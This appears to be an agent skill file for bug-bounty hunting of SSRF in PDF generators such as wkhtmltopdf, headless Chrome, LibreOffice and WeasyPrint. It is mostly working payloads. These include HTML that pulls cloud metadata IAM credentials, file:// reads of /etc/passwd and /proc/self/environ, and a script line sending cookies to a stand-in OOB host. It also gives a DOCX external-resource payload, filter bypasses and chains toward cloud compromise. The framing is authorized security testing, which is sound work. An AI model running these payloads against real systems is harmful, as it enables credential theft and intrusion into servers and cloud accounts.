---
name: hunt-pdf-ssrf
description: "Hunt PDF generation SSRF — wkhtmltopdf, headless Chrome, LibreOffice, WeasyPrint. Targets endpoints that convert HTML/URL to PDF and fetch user-controlled external resources server-side. Use when a target has export-to-PDF, invoice generation, report download, or HTML-to-PDF conversion."
---

## Decision tree

| You see | Do once | Proves |
|---|---|---|
| Export PDF, "Download as PDF", invoice/report generation | Inject HTML with `<img>`, `<iframe>`, `<link>` pointing to OOB domain | OOB callback received from server IP |
| URL parameter fed to PDF renderer (`?url=`, `?html=`, `?template=`) | Point to `http://169.254.169.254/latest/meta-data/` | Cloud metadata in PDF content |
| HTML body accepted for PDF conversion | `<iframe src="file:///etc/hostname" width="800" height="200">` | Local file content rendered in PDF |
| SVG/image upload rendered in PDF | `<image xlink:href="http://OOB/svg-ssrf">` inside SVG | OOB callback from SVG processing |

## wkhtmltopdf (most common)

Fetches ALL external resources in HTML — CSS, images, iframes, JavaScript.

```html
<img src="http://OOB_DOMAIN/wk-img-TAG">
<link rel="stylesheet" href="http://OOB_DOMAIN/wk-css-TAG">
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="800" height="600">
<script>document.write('<img src="http://OOB_DOMAIN/wk-js-'+document.cookie+'">')</script>
```

Older wkhtmltopdf allows `file://` protocol:
```html
<iframe src="file:///etc/passwd" width="800" height="400">
<img src="file:///proc/self/environ">
```

## Headless Chrome PDF (`page.pdf()`)

Chrome blocks `file://` by default. Focus on SSRF to internal services:
```html
<img src="http://127.0.0.1:8080/admin">
<link rel="stylesheet" href="http://internal-api.local/health">
<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/user-data">
```

If `page.goto(userUrl)` is used (not just HTML injection):
```
?url=http://169.254.169.254/latest/meta-data/
?url=http://127.0.0.1:6379/INFO
?url=http://internal-service.local:8080/
```

## LibreOffice / document conversion

DOCX/ODT with external entity or embedded OLE:
```xml
<!-- In word/document.xml of a .docx -->
<w:altChunk r:id="rId9"/>
<!-- In word/_rels/document.xml.rels -->
<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk"
  Target="http://OOB_DOMAIN/libre-TAG" TargetMode="External"/>
```

## WeasyPrint

Fetches CSS `url()` and `@import`:
```html
<style>@import url("http://OOB_DOMAIN/weasy-TAG");</style>
<div style="background: url('http://169.254.169.254/latest/meta-data/')"></div>
```

## Bypasses

| Block | Bypass |
|---|---|
| `http://` blocked | `//OOB_DOMAIN/TAG` (protocol-relative) |
| `localhost` blocked | `http://0.0.0.0/`, `http://[::1]/`, `http://0x7f000001/` |
| Internal IP blocked | DNS rebinding: domain resolving to `127.0.0.1` |
| Allowlist on domain | `http://allowed.com@attacker.com/` or redirect from allowed domain |

## Validation

- **OOB**: callback received at `OOB_DOMAIN/TAG` from the target's server IP — not your browser
- **Metadata**: open the generated PDF, find cloud metadata (IAM role, instance-id, user-data)
- **File read**: local file content visible in PDF text or rendered in iframe
- Download the PDF and extract text: `pdftotext output.pdf -` or open in browser

A PDF that simply renders your `<img>` tag as a broken image is NOT proof. The server must have made the outbound request.

## Chains

- Metadata credentials → `hunt-ssrf` (escalate to full cloud compromise)
- File read (`/etc/passwd`, `/proc/self/environ`) → `hunt-lfi` (prove broader file access)
- Internal service access → `hunt-ssrf` (pivot to internal APIs)
- JavaScript execution in PDF → `hunt-xss` if PDF is served inline with `Content-Type: text/html`

## Before you report — dedup gate

```bash
python3 engine/dedup.py check --program <program> --class pdf-ssrf --url "<endpoint>" --title "<title>"
```

`NOVEL` → `/validate`. `LIKELY_DUP` → stop. Draft only — do not submit.

Cross-refs: `hunt-ssrf`, `hunt-lfi`, `hunt-file-upload`, `hunt-ssti`.
